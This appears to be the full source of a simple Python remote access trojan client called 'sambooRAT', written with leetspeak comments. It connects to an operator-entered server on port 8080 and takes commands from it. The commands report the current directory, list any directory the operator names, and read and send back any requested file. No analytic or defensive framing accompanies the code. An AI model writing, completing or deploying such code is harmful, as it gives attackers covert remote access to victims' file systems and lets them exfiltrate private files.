#C0MM4ND L1ST
# view_cwd - show all files in curr. dir.



import os
import socket

s = socket.socket ()
port=8080
host = input(str("Please enter server address of the sambooRAT server: "))
s.connect((host, port))
print("")
print("Connected to the server succesfully")
print("")

#C0N3CT3D
#C0MM4ND R3C3!V3

while 1:
    command = s.recv(1024)
    command = command.decode()
    print("Command received")
    print("")
    if command == "whereami":
        files = os.getcwd()
        files = str(files)
        s.send(files.encode())
        print("Command executed..")

    elif command == "custom_dir":
        user_input = s.recv(5000)
        user_input = user_input.decode()
        files = os.listdir(user_input)
        files = str(files)
        s.send(files.encode())
        print("")
        print("")
        print("Command has been 3XECUT3D succesfully")

    elif command == "download":
        file_path = s.recv(5000)
        file_path = file_path.decode()
        file = open(file_path, "rb")
        data = file.read()
        s.send(data)
        print("")
        print("File has been sent succesFully")


    else:
        print("")
        print("The C0MM4ND was fucked up.")